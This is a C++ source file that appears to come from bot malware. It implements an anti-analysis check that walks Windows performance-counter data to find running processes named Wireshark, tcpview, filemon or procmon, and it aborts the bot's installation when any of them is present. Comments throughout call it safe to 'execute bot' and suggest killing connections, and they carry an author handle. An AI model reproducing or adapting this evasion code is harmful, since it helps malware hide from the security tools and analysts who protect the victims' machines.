
#ifndef NO_KILLP

#include "stdafx.h"
#include <windows.h>
#include "../h/blist.h"
#include <comdef.h>
#include <vector>

PPERF_OBJECT_TYPE FirstObject( PPERF_DATA_BLOCK PerfData )
{
    return( (PPERF_OBJECT_TYPE)((PBYTE)PerfData + 
        PerfData->HeaderLength) );
}
PPERF_OBJECT_TYPE NextObject( PPERF_OBJECT_TYPE PerfObj )
{
    return( (PPERF_OBJECT_TYPE)((PBYTE)PerfObj + 
        PerfObj->TotalByteLength) );
}
PPERF_INSTANCE_DEFINITION FirstInstance( PPERF_OBJECT_TYPE PerfObj )
{
    return( (PPERF_INSTANCE_DEFINITION)((PBYTE)PerfObj + 
        PerfObj->DefinitionLength) );
}
PPERF_INSTANCE_DEFINITION NextInstance( 
    PPERF_INSTANCE_DEFINITION PerfInst )
{
    PPERF_COUNTER_BLOCK PerfCntrBlk;
    PerfCntrBlk = (PPERF_COUNTER_BLOCK)((PBYTE)PerfInst + 
        PerfInst->ByteLength);
    return( (PPERF_INSTANCE_DEFINITION)((PBYTE)PerfCntrBlk + 
        PerfCntrBlk->ByteLength) );
}
PPERF_COUNTER_DEFINITION FirstCounter( PPERF_OBJECT_TYPE PerfObj )
{
    return( (PPERF_COUNTER_DEFINITION) ((PBYTE)PerfObj + 
        PerfObj->HeaderLength) );
}
PPERF_COUNTER_DEFINITION NextCounter( 
    PPERF_COUNTER_DEFINITION PerfCntr )
{
    return( (PPERF_COUNTER_DEFINITION)((PBYTE)PerfCntr + 
        PerfCntr->ByteLength) );
}
PPERF_COUNTER_BLOCK CounterBlock(PPERF_INSTANCE_DEFINITION PerfInst)
{
	return (PPERF_COUNTER_BLOCK) ((LPBYTE) PerfInst + PerfInst->ByteLength);
}
#define TOTALBYTES    64*1024
#define BYTEINCREMENT 1024
#define PROCESS_OBJECT_INDEX	230
#define PROC_ID_COUNTER			784
void GetProcessID(LPCTSTR pProcessName, std::vector<DWORD>& SetOfPID)
{
    PPERF_DATA_BLOCK pPerfData = NULL;
    PPERF_OBJECT_TYPE pPerfObj;
    PPERF_INSTANCE_DEFINITION pPerfInst;
    PPERF_COUNTER_DEFINITION pPerfCntr, pCurCntr;
    PPERF_COUNTER_BLOCK PtrToCntr;
    DWORD BufferSize = TOTALBYTES;
    DWORD i, j;
	LONG k;
    pPerfData = (PPERF_DATA_BLOCK) malloc( BufferSize );
	char szKey[32];
	sprintf(szKey,"%d %d",PROCESS_OBJECT_INDEX, PROC_ID_COUNTER);
	LONG lRes;
    while( (lRes = RegQueryValueEx( HKEY_PERFORMANCE_DATA,szKey,NULL,NULL,(LPBYTE) pPerfData,&BufferSize )) == ERROR_MORE_DATA )
    {
        BufferSize += BYTEINCREMENT;
        pPerfData = (PPERF_DATA_BLOCK) realloc( pPerfData, BufferSize );
    }
    pPerfObj = FirstObject( pPerfData );
    for( i=0; i < pPerfData->NumObjectTypes; i++ )
    {
		if (pPerfObj->ObjectNameTitleIndex != PROCESS_OBJECT_INDEX)
		{
			pPerfObj = NextObject( pPerfObj );
			continue;
		}
		SetOfPID.clear();
        pPerfCntr = FirstCounter( pPerfObj );
        pPerfInst = FirstInstance( pPerfObj );
		_bstr_t bstrProcessName,bstrInput;
        for( k=0; k < pPerfObj->NumInstances; k++ )
        {
			pCurCntr = pPerfCntr;
			bstrInput = pProcessName;
			bstrProcessName = (wchar_t *)((PBYTE)pPerfInst + pPerfInst->NameOffset);
			if (!stricmp((LPCTSTR)bstrProcessName, (LPCTSTR) bstrInput))
			{
				for( j=0; j < pPerfObj->NumCounters; j++ )
				{
					if (pCurCntr->CounterNameTitleIndex == PROC_ID_COUNTER)
					{
						PtrToCntr = CounterBlock(pPerfInst);
						DWORD *pdwValue = (DWORD*)((LPBYTE) PtrToCntr + pCurCntr->CounterOffset);
						SetOfPID.push_back(*pdwValue);
						break;
					}
					pCurCntr = NextCounter( pCurCntr );
				}
			}
            pPerfInst = NextInstance( pPerfInst );
        }
    }
	free(pPerfData);
	RegCloseKey(HKEY_PERFORMANCE_DATA);
}
int pmain1()
{
	std::vector<DWORD> SetOfPID;
	GetProcessID("Wireshark",SetOfPID);
	if (SetOfPID.empty())
	{
		// Nothing found running, Safe to execute bot.
	}
	else
	{
		// One of the process was found running, Exit install.
		// If you want to you could also make it kill connections or cut process. ~ h1t3m
	ExitProcess(0);
	}
	return 0;
}

int pmain2()
{
	std::vector<DWORD> SetOfPID;
	GetProcessID("tcpview",SetOfPID);
	if (SetOfPID.empty())
	{
		// Nothing found running, Safe to execute bot.
	}
	else
	{
		// One of the process was found running, Exit install.
		// If you want to you could also make it kill connections or cut process. ~ h1t3m
	ExitProcess(0);
	}
	return 0;
}

int pmain3()
{
	std::vector<DWORD> SetOfPID;
	GetProcessID("filemon",SetOfPID);
	if (SetOfPID.empty())
	{
		// Nothing found running, Safe to execute bot.
	}
	else
	{
		// One of the process was found running, Exit install.
		// If you want to you could also make it kill connections or cut process. ~ h1t3m
	ExitProcess(0);
	}
	return 0;
}

int pmain4()
{
	std::vector<DWORD> SetOfPID;
	GetProcessID("procmon",SetOfPID);
	if (SetOfPID.empty())
	{
		// Nothing found running, Safe to execute bot.
	}
	else
	{
		// One of the process was found running, Exit install.
		// If you want to you could also make it kill connections or cut process. ~ h1t3m
	ExitProcess(0);
	}
	return 0;
}

int ifproc()
{
	pmain1();
	pmain2();
	pmain3();
	pmain4();
	return 0;
}

#endif